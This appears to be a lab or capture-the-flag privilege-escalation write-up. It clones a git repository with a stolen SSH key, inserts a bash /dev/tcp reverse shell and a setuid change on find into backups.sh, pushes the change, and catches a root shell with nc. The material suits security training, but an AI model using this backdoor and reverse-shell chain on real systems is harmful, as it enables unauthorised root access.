# 5 privesc git-user git-repo > root

```
$ git clone git@192.168.49.136
# cant run this as ssh is running on port 43022 and we have git_id_rsa

# googling git clone using ssh key
Using https://stackoverflow.com/questions/4565700/how-to-specify-the-private-ssh-key-to-use-when-executing-shell-command-on-git
# GIT_SSH_COMMAND='ssh -i private_key_file -o IdentitiesOnly=yes' git clone user@host:repo.git

# cloned
$ GIT_SSH_COMMAND='ssh -i git_id_rsa -p 43022 -o IdentitiesOnly=yes' git clone git@192.168.136.125:/git-server/
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.

# update backups.sh
$ cat backups.sh
!#/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.49.136/18030 0>&1' &

$ chmod +s /usr/bin/find;

# git add and commit

$ git add backups.sh
$ git commit -m "kashz"
[master f295f14] kashz
 1 file changed, 3 insertions(+), 5 deletions(-)
 mode change 100644 => 100755 backups.sh
 
# push changes to server
$ GIT_SSH_COMMAND='ssh -i ../git_id_rsa -p 43022' git push -u origin
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 8 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 382 bytes | 382.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
To 192.168.136.125:/git-server/
   b50f4e5..f295f14  master -> master
Branch 'master' set up to track remote branch 'master' from 'origin'.

# wait for shell

$ nc -lvnp 18030
listening on [any] 18030 ...
connect to [192.168.49.136] from (UNKNOWN) [192.168.136.125] 51524
bash: cannot set terminal process group (832): Inappropriate ioctl for device
bash: no job control in this shell
[root@hunit ~]# whoami;id;hostname;uname -a
whoami;id;hostname;uname -a
root
uid=0(root) gid=0(root) groups=0(root)
bash: hostname: command not found
Linux hunit 5.9.4-arch1-1 #1 SMP PREEMPT Wed, 04 Nov 2020 21:41:09 +0000 x86_64 GNU/Linux
```
